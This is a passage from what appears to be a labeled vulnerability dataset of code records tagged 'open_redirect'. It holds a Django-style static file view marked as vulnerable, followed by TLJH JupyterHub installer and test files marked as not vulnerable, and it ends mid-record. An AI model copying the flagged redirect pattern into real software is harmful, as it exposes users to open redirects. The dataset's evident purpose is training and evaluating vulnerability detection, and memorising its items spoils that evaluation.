\"\"\"\n    path = posixpath.normpath(path)\n    path = path.lstrip('/')\n    newpath = ''\n    for part in path.split('/'):\n        if not part:\n            # Strip empty path components.\n            continue\n        drive, part = os.path.splitdrive(part)\n        head, part = os.path.split(part)\n        if part in (os.curdir, os.pardir):\n            # Strip '.' and '..' in path.\n            continue\n        newpath = os.path.join(newpath, part).replace('\\\\', '/')\n    if newpath and path != newpath:\n        return HttpResponseRedirect(newpath)\n    fullpath = os.path.join(document_root, newpath)\n    if os.path.isdir(fullpath):\n        if show_indexes:\n            return directory_index(newpath, fullpath)\n        raise Http404(_(\"Directory indexes are not allowed here.\"))\n    if not os.path.exists(fullpath):\n        raise Http404(_('\"%(path)s\" does not exist') % {'path': fullpath})\n    # Respect the If-Modified-Since header.\n    statobj = os.stat(fullpath)\n    if not was_modified_since(request.META.get('HTTP_IF_MODIFIED_SINCE'),\n                              statobj.st_mtime, statobj.st_size):\n        return HttpResponseNotModified()\n    content_type, encoding = mimetypes.guess_type(fullpath)\n    content_type = content_type or 'application/octet-stream'\n    response = FileResponse(open(fullpath, 'rb'), content_type=content_type)\n    response[\"Last-Modified\"] = http_date(statobj.st_mtime)\n    if stat.S_ISREG(statobj.st_mode):\n        response[\"Content-Length\"] = statobj.st_size\n    if encoding:\n        response[\"Content-Encoding\"] = encoding\n    return response\n\n\nDEFAULT_DIRECTORY_INDEX_TEMPLATE = \"\"\"\n{% load i18n %}\n<!DOCTYPE html>\n<html lang=\"en\">\n  <head>\n    <meta http-equiv=\"Content-type\" content=\"text/html; charset=utf-8\" />\n    <meta http-equiv=\"Content-Language\" content=\"en-us\" />\n    <meta name=\"robots\" content=\"NONE,NOARCHIVE\" />\n    <title>{% blocktrans %}Index of {{ directory }}{% endblocktrans %}</title>\n  </head>\n  <body>\n    <h1>{% blocktrans %}Index of {{ directory }}{% endblocktrans %}</h1>\n    <ul>\n      {% if directory != \"/\" %}\n      <li><a href=\"../\">../</a></li>\n      {% endif %}\n      {% for f in file_list %}\n      <li><a href=\"{{ f|urlencode }}\">{{ f }}</a></li>\n      {% endfor %}\n    </ul>\n  </body>\n</html>\n\"\"\"\ntemplate_translatable = gettext_lazy(\"Index of %(directory)s\")\n\n\ndef directory_index(path, fullpath):\n    try:\n        t = loader.select_template([\n            'static/directory_index.html',\n            'static/directory_index',\n        ])\n    except TemplateDoesNotExist:\n        t = Engine(libraries={'i18n': 'django.templatetags.i18n'}).from_string(DEFAULT_DIRECTORY_INDEX_TEMPLATE)\n    files = []\n    for f in os.listdir(fullpath):\n        if not f.startswith('.'):\n            if os.path.isdir(os.path.join(fullpath, f)):\n                f += '/'\n            files.append(f)\n    c = Context({\n        'directory': path + '/',\n        'file_list': files,\n    })\n    return HttpResponse(t.render(c))\n\n\ndef was_modified_since(header=None, mtime=0, size=0):\n    \"\"\"\n    Was something modified since the user last downloaded it?\n\n    header\n      This is the value of the If-Modified-Since header.  If this is None,\n      I'll just return True.\n\n    mtime\n      This is the modification time of the item we're talking about.\n\n    size\n      This is the size of the item we're talking about.\n    \"\"\"\n    try:\n        if header is None:\n            raise ValueError\n        matches = re.match(r\"^([^;]+)(; length=([0-9]+))?$\", header,\n                           re.IGNORECASE)\n        header_mtime = parse_http_date(matches.group(1))\n        header_len = matches.group(3)\n        if header_len and int(header_len) != size:\n            raise ValueError\n        if int(mtime) > header_mtime:\n            raise ValueError\n    except (AttributeError, ValueError, OverflowError):\n        return True\n    return False\n/n/n/n", "label": 1, "vtype": "open_redirect"}, {"id": "d9a4e64dfa2d8ac486aa6364920226f8e0a9072e", "code": "integration-tests/test_extensions.py/n/nimport os\nimport subprocess\n\n\ndef test_serverextensions():\n    \"\"\"\n    Validate serverextensions we want are installed\n    \"\"\"\n    # jupyter-serverextension writes to stdout and stderr weirdly\n    proc = subprocess.run([\n        '/opt/tljh/user/bin/jupyter-serverextension',\n        'list', '--sys-prefix'\n    ], stderr=subprocess.PIPE)\n\n    extensions = [\n        'jupyterlab 0.35.4',\n        'nbgitpuller 0.6.1',\n        'nteract_on_jupyter 2.0.7',\n        'nbresuse '\n    ]\n\n    for e in extensions:\n        assert '{} \\x1b[32mOK\\x1b[0m'.format(e) in proc.stderr.decode()\n\ndef test_nbextensions():\n    \"\"\"\n    Validate nbextensions we want are installed & enabled\n    \"\"\"\n    # jupyter-nbextension writes to stdout and stderr weirdly\n    proc = subprocess.run([\n        '/opt/tljh/user/bin/jupyter-nbextension',\n        'list', '--sys-prefix'\n    ], stderr=subprocess.PIPE, stdout=subprocess.PIPE)\n\n    extensions = [\n        'nbresuse/main',\n        # This is what ipywidgets nbextension is called\n        'jupyter-js-widgets/extension'\n    ]\n\n    for e in extensions:\n        assert '{} \\x1b[32m enabled \\x1b[0m'.format(e) in proc.stdout.decode()\n\n    # Ensure we have 'OK' messages in our stdout, to make sure everything is importable\n    assert proc.stderr.decode() == '      - Validating: \\x1b[32mOK\\x1b[0m\\n' * len(extensions)\n\n\ndef test_labextensions():\n    \"\"\"\n    Validate labextensions we want installed\n    \"\"\"\n    # Currently we only install jupyterhub\n    assert os.path.exists('/opt/tljh/user/bin/jupyter-labhub')\n/n/n/ntljh/installer.py/n/n\"\"\"Installation logic for TLJH\"\"\"\n\nimport argparse\nimport itertools\nimport logging\nimport os\nimport secrets\nimport subprocess\nimport sys\nimport time\nfrom urllib.error import HTTPError\nfrom urllib.request import urlopen, URLError\n\nimport pluggy\n\nfrom tljh import (\n    apt,\n    conda,\n    hooks,\n    migrator,\n    systemd,\n    traefik,\n    user,\n)\nfrom .config import (\n    CONFIG_DIR,\n    CONFIG_FILE,\n    HUB_ENV_PREFIX,\n    INSTALL_PREFIX,\n    STATE_DIR,\n    USER_ENV_PREFIX,\n)\nfrom .yaml import yaml\n\nHERE = os.path.abspath(os.path.dirname(__file__))\n\n\nlogger = logging.getLogger(\"tljh\")\n\ndef ensure_node():\n    \"\"\"\n    Ensure nodejs from nodesource is installed\n    \"\"\"\n    key = b\"\"\"\n-----BEGIN PGP PUBLIC KEY BLOCK-----\nVersion: GnuPG v1\nComment: GPGTools - https://gpgtools.org\n\n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\n=CLGF\n-----END PGP PUBLIC KEY BLOCK-----\n    \"\"\".strip()\n    apt.trust_gpg_key(key)\n    apt.add_source('nodesource', 'https://deb.nodesource.com/node_10.x', 'main')\n    apt.install_packages(['nodejs'])\n\ndef remove_chp():\n    \"\"\"\n    Ensure CHP is not running\n    \"\"\"\n    if os.path.exists(\"/etc/systemd/system/configurable-http-proxy.service\"):\n        if systemd.check_service_active('configurable-http-proxy.service'):\n            try:\n                systemd.stop_service('configurable-http-proxy.service')\n            except subprocess.CalledProcessError:\n                logger.info(\"Cannot stop configurable-http-proxy...\")\n        if systemd.check_service_enabled('configurable-http-proxy.service'):\n            try:\n                systemd.disable_service('configurable-http-proxy.service')\n            except subprocess.CalledProcessError:\n                logger.info(\"Cannot disable configurable-http-proxy...\")\n        try:\n            systemd.uninstall_unit('configurable-http-proxy.service')\n        except subprocess.CalledProcessError:\n            logger.info(\"Cannot uninstall configurable-http-proxy...\")\n\n\ndef ensure_jupyterhub_service(prefix):\n    \"\"\"\n    Ensure JupyterHub Services are set up properly\n    \"\"\"\n\n    os.makedirs(STATE_DIR, mode=0o700, exist_ok=True)\n\n    remove_chp()\n    systemd.reload_daemon()\n\n    with open(os.path.join(HERE, 'systemd-units', 'jupyterhub.service')) as f:\n        hub_unit_template = f.read()\n\n\n    with open(os.path.join(HERE, 'systemd-units', 'traefik.service')) as f:\n        traefik_unit_template = f.read()\n\n    #Set up proxy / hub secret token if it is not already setup\n    proxy_secret_path = os.path.join(STATE_DIR, 'traefik-api.secret')\n    if not os.path.exists(proxy_secret_path):\n        with open(proxy_secret_path, 'w') as f:\n            f.write(secrets.token_hex(32))\n\n    traefik.ensure_traefik_config(STATE_DIR)\n\n    unit_params = dict(\n        python_interpreter_path=sys.executable,\n        jupyterhub_config_path=os.path.join(HERE, 'jupyterhub_config.py'),\n        install_prefix=INSTALL_PREFIX,\n    )\n    systemd.install_unit('jupyterhub.service', hub_unit_template.format(**unit_params))\n    systemd.install_unit('traefik.service', traefik_unit_template.format(**unit_params))\n    systemd.reload_daemon()\n\n    # If JupyterHub is running, we want to restart it.\n    systemd.restart_service('jupyterhub')\n    systemd.restart_service('traefik')\n\n    # Mark JupyterHub & traefik to start at boot time\n    systemd.enable_service('jupyterhub')\n    systemd.enable_service('traefik')\n\n\ndef ensure_jupyterlab_extensions():\n    \"\"\"\n    Install the JupyterLab extensions we want.\n    \"\"\"\n    extensions = [\n        '@jupyterlab/hub-extension',\n        '@jupyter-widgets/jupyterlab-manager'\n    ]\n    subprocess.check_output([\n        os.path.join(USER_ENV_PREFIX, 'bin/jupyter'),\n        'labextension',\n        'install'\n    ] + extensions)\n\n\ndef ensure_jupyterhub_package(prefix):\n    \"\"\"\n    Install JupyterHub into our conda environment if needed.\n\n    We install all python packages from PyPI as much as possible in the\n    hub environment. A lot of spawners & authenticators do not have conda-forge\n    packages, but do have pip packages. Keeping all python packages in the\n    hub environment be installed with pip prevents accidental mixing of python\n    and conda packages!\n    \"\"\"\n    conda.ensure_pip_packages(prefix, [\n        'jupyterhub==0.9.5',\n        'jupyterhub-dummyauthenticator==0.3.1',\n        'jupyterhub-systemdspawner==0.11',\n        'jupyterhub-firstuseauthenticator==0.12',\n        'jupyterhub-nativeauthenticator==0.0.4',\n        'jupyterhub-ldapauthenticator==1.2.2',\n        'oauthenticator==0.8.1'\n    ])\n    traefik.ensure_traefik_binary(prefix)\n\n\ndef ensure_usergroups():\n    \"\"\"\n    Sets up user groups & sudo rules\n    \"\"\"\n    user.ensure_group('jupyterhub-admins')\n    user.ensure_group('jupyterhub-users')\n\n    logger.info(\"Granting passwordless sudo to JupyterHub admins...\")\n    with open('/etc/sudoers.d/jupyterhub-admins', 'w') as f:\n        # JupyterHub admins should have full passwordless sudo access\n        f.write('%jupyterhub-admins ALL = (ALL) NOPASSWD: ALL\\n')\n        # `sudo -E` should preserve the $PATH we set. This allows\n        # admins in jupyter terminals to do `sudo -E pip install <package>`,\n        # `pip` is in the $PATH we set in jupyterhub_config.py to include the user conda env.\n        f.write('Defaults exempt_group = jupyterhub-admins\\n')\n\n\ndef ensure_user_environment(user_requirements_txt_file):\n    \"\"\"\n    Set up user conda environment with required packages\n    \"\"\"\n    logger.info(\"Setting up user environment...\")\n    miniconda_version = '4.5.4'\n    miniconda_installer_md5 = \"a946ea1d0c4a642ddf0c3a26a18bb16d\"\n\n    if not conda.check_miniconda_version(USER_ENV_PREFIX, miniconda_version):\n        logger.info('Downloading & setting up user environment...')\n        with conda.download_miniconda_installer(miniconda_version, miniconda_installer_md5) as installer_path:\n            conda.install_miniconda(installer_path, USER_ENV_PREFIX)\n\n    # nbresuse needs psutil, which requires gcc\n    apt.install_packages([\n        'gcc'\n    ])\n\n    conda.ensure_conda_packages(USER_ENV_PREFIX, [\n        # Conda's latest version is on conda much more so than on PyPI.\n        'conda==4.5.8'\n    ])\n\n    conda.ensure_pip_packages(USER_ENV_PREFIX, [\n        # JupyterHub + notebook package are base requirements for user environment\n        'jupyterhub==0.9.5',\n        'notebook==5.7.7',\n        # Install additional notebook frontends!\n        'jupyterlab==0.35.4',\n        'nteract-on-jupyter==2.0.7',\n        # nbgitpuller for easily pulling in Git repositories\n        'nbgitpuller==0.6.1',\n        # nbresuse to show people how much RAM they are using\n        'nbresuse==0.3.0',\n        # Most people consider ipywidgets to be part of the core notebook experience\n        'ipywidgets==7.4.2',\n        # Pin tornado\n        'tornado<6.0'\n    ])\n\n    if user_requirements_txt_file:\n        # FIXME: This currently fails hard, should fail soft and not abort installer\n        conda.ensure_pip_requirements(USER_ENV_PREFIX, user_requirements_txt_file)\n\n\ndef ensure_admins(admins):\n    \"\"\"\n    Setup given list of users as admins.\n    \"\"\"\n    if not admins:\n        return\n    logger.info(\"Setting up admin users\")\n    config_path = CONFIG_FILE\n    if os.path.exists(config_path):\n        with open(config_path, 'r') as f:\n            config = yaml.load(f)\n    else:\n        config = {}\n\n    config['users'] = config.get('users', {})\n    config['users']['admin'] = list(admins)\n\n    with open(config_path, 'w+') as f:\n        yaml.dump(config, f)\n\n\ndef ensure_jupyterhub_running(times=20):\n    \"\"\"\n    Ensure that JupyterHub is up and running\n\n    Loops given number of times, waiting a second each.\n    \"\"\"\n\n    for i in range(times):\n        try:\n            logger.info('Waiting for JupyterHub to come up ({}/{} tries)'.format(i + 1, times))\n            urlopen('http://127.0.0.1')\n            return\n        except HTTPError as h:\n            if h.code in [404, 502, 503]:\n                # May be transient\n                time.sleep(1)\n                continue\n            # Everything else should immediately abort\n            raise\n        except URLError as e:\n            if isinstance(e.reason, ConnectionRefusedError):\n                # Hub isn't up yet, sleep & loop\n                time.sleep(1)\n                continue\n            # Everything else should immediately abort\n            raise\n\n    raise Exception(\"Installation failed: JupyterHub did not start in {}s\".format(times))\n\n\ndef ensure_symlinks(prefix):\n    \"\"\"\n    Ensure we symlink appropriate things into /usr/bin\n\n    We add the user conda environment to PATH for notebook terminals,\n    but not the hub venv. This means tljh-config is not actually accessible.\n\n    We symlink to /usr/bin and not /usr/local/bin, since /usr/local/bin is\n    not place, and works with sudo -E in sudo's search $PATH. We can work\n    around this with sudo -E and extra entries in the sudoers file, but this\n    is far more secure at the cost of upsetting some FHS purists.\n    \"\"\"\n    tljh_config_src = os.path.join(prefix, 'bin', 'tljh-config')\n    tljh_config_dest = '/usr/bin/tljh-config'\n    if os.path.exists(tljh_config_dest):\n        if os.path.realpath(tljh_config_dest) != tljh_config_src:\n            #  tljh-config exists that isn't ours. We should *not* delete this file,\n            # instead we throw an error and abort. Deleting files owned by other people\n            # while running as root is dangerous, especially with symlinks involved.\n            raise FileExistsError(f'/usr/bin/tljh-config exists but is not a symlink to {tljh_config_src}')\n        else:\n            # We have a working symlink, so do nothing\n            return\n    os.symlink(tljh_config_src, tljh_config_dest)\n\n\ndef setup_plugins(plugins=None):\n    \"\"\"\n    Install plugins & setup a pluginmanager\n    \"\"\"\n    # Install plugins\n    if plugins:\n        conda.ensure_pip_packages(HUB_ENV_PREFIX, plugins)\n\n    # Set up plugin infrastructure\n    pm = pluggy.PluginManager('tljh')\n    pm.add_hookspecs(hooks)\n    pm.load_setuptools_entrypoints('tljh')\n\n    return pm\n\n\ndef run_plugin_actions(plugin_manager, plugins):\n    \"\"\"\n    Run installer hooks defined in plugins\n    \"\"\"\n    hook = plugin_manager.hook\n    # Install apt packages\n    apt_packages = list(set(itertools.chain(*hook.tljh_extra_apt_packages())))\n    if apt_packages:\n        logger.info('Installing {} apt packages collected from plugins: {}'.format(\n            len(apt_packages), ' '.join(apt_packages)\n        ))\n        apt.install_packages(apt_packages)\n\n    # Install conda packages\n    conda_packages = list(set(itertools.chain(*hook.tljh_extra_user_conda_packages())))\n    if conda_packages:\n        logger.info('Installing {} conda packages collected from plugins: {}'.format(\n            len(conda_packages), ' '.join(conda_packages)\n        ))\n        conda.ensure_conda_packages(USER_ENV_PREFIX, conda_packages)\n\n    # Install pip packages\n    pip_packages = list(set(itertools.chain(*hook.tljh_extra_user_pip_packages())))\n    if pip_packages:\n        logger.info('Installing {} pip packages collected from plugins: {}'.format(\n            len(pip_packages), ' '.join(pip_packages)\n        ))\n        conda.ensure_pip_packages(USER_ENV_PREFIX, pip_packages)\n\n\ndef ensure_config_yaml(plugin_manager):\n    \"\"\"\n    Ensure we have a config.yaml present\n    \"\"\"\n    # ensure config dir exists and is private\n    for path in [CONFIG_DIR, os.path.join(CONFIG_DIR, 'jupyterhub_config.d')]:\n        os.makedirs(path, mode=0o700, exist_ok=True)\n\n    migrator.migrate_config_files()\n\n    if os.path.exists(CONFIG_FILE):\n        with open(CONFIG_FILE, 'r') as f:\n            config = yaml.load(f)\n    else:\n        config = {}\n\n    hook = plugin_manager.hook\n    hook.tljh_config_post_install(config=config)\n\n    with open(CONFIG_FILE, 'w+') as f:\n        yaml.dump(config, f)\n\n\ndef main():\n    from .log import init_logging\n    init_logging()\n\n    argparser = argparse.ArgumentParser()\n    argparser.add_argument(\n        '--admin',\n        nargs='*',\n        help='List of usernames set to be admin'\n    )\n    argparser.add_argument(\n        '--user-requirements-txt-url',\n        help='URL to a requirements.txt file that should be installed in the user enviornment'\n    )\n    argparser.add_argument(\n        '--plugin',\n        nargs='*',\n        help='Plugin pip-specs to install'\n    )\n\n    args = argparser.parse_args()\n\n    pm = setup_plugins(args.plugin)\n\n    ensure_config_yaml(pm)\n    ensure_admins(args.admin)\n    ensure_usergroups()\n    ensure_user_environment(args.user_requirements_txt_url)\n\n    logger.info(\"Setting up JupyterHub...\")\n    ensure_node()\n    ensure_jupyterhub_package(HUB_ENV_PREFIX)\n    ensure_jupyterlab_extensions()\n    ensure_jupyterhub_service(HUB_ENV_PREFIX)\n    ensure_jupyterhub_running()\n    ensure_symlinks(HUB_ENV_PREFIX)\n\n    # Run installer plugins last\n    run_plugin_actions(pm, args.plugin)\n\n    logger.info(\"Done!\")\n\n\nif __name__ == '__main__':\n    main()\n/n/n/n", "label": 0, "vtype": "open_redirect"}, {"id": "d9a4e64dfa2d8ac486aa6364920226f8e0a9072e", "code": "/integration-tests/test_extensions.py/n/nimport os\nimport subprocess\n\n\ndef test_serverextensions():\n    \"\"\"\n    Validate serverextensions we want are installed\n    \"\"\"\n    # jupyter-serverextension writes to stdout and stderr weirdly\n    proc = subprocess.run([\n        '/opt/tljh/user/bin/jupyter-serverextension',\n        'list', '--sys-prefix'\n    ], stderr=subprocess.PIPE)\n\n    extensions = [\n        'jupyterlab 0.35.3',\n        'nbgitpuller 0.6.1',\n        'nteract_on_jupyter 1.9.12',\n        'nbresuse '\n    ]\n\n    for e in extensions:\n        assert '{} \\x1b[32mOK\\x1b[0m'.format(e) in proc.stderr.decode()\n\ndef test_nbextensions():\n    \"\"\"\n    Validate nbextensions we want are installed & enabled\n    \"\"\"\n    # jupyter-nbextension writes to stdout and stderr weirdly\n    proc = subprocess.run([\n        '/opt/tljh/user/bin/jupyter-nbextension',\n        'list', '--sys-prefix'\n    ], stderr=subprocess.PIPE, stdout=subprocess.PIPE)\n\n    extensions = [\n        'nbresuse/main',\n        # This is what ipywidgets nbextension is called\n        'jupyter-js-widgets/extension'\n    ]\n\n    for e in extensions:\n        assert '{} \\x1b[32m enabled \\x1b[0m'.format(e) in proc.stdout.decode()\n\n    # Ensure we have 'OK' messages in our stdout, to make sure everything is importable\n    assert proc.stderr.decode() == '      - Validating: \\x1b[32mOK\\x1b[0m\\n' * len(extensions)\n\n\ndef test_labextensions():\n    \"\"\"\n    Validate labextensions we want installed\n    \"\"\"\n    # Currently we only install jupyterhub\n    assert os.path.exists('/opt/tljh/user/bin/jupyter-labhub')\n/n/n/n/tljh/installer.py/n/n\"\"\"Installation logic for TLJH\"\"\"\n\nimport argparse\nimport itertools\nimport logging\nimport os\nimport secrets\nimport subprocess\nimport sys\nimport time\nfrom urllib.error import HTTPError\nfrom urllib.request import urlopen, URLError\n\nimport pluggy\n\nfrom tljh import (\n    apt,\n    conda,\n    hooks,\n    migrator,\n    systemd,\n    traefik,\n    user,\n)\nfrom .config import (\n    CONFIG_DIR,\n    CONFIG_FILE,\n    HUB_ENV_PREFIX,\n    INSTALL_PREFIX,\n    STATE_DIR,\n    USER_ENV_PREFIX,\n)\nfrom .yaml import yaml\n\nHERE = os.path.abspath(os.path.dirname(__file__))\n\n\nlogger = logging.getLogger(\"tljh\")\n\ndef ensure_node():\n    \"\"\"\n    Ensure nodejs from nodesource is installed\n    \"\"\"\n    key = b\"\"\"\n-----BEGIN PGP PUBLIC KEY BLOCK-----\nVersion: GnuPG v1\nComment: GPGTools - https://gpgtools.org\n\n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